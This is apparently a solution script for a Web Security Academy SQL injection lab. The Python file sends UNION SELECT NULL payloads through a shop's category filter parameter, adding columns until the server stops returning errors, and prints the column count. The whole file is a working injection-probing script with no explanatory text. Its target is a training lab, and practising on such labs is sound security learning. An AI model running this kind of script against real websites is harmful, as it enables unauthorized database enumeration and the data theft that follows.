# usage:
# python3 3.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")

    def solve(self) -> None:
        s = requests.Session()

        i = 1
        r = s.get(f"{self.url}/filter?category=Accessories'+UNION+SELECT+NULL--")
        while r.status_code == 500:
            i += 1
            nulls = ["NULL"] * i
            r = s.get(
                f"{self.url}/filter?category=Accessories'+UNION+SELECT+{','.join(nulls)}--"
            )

        print(f"Number of columns: {i}")


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
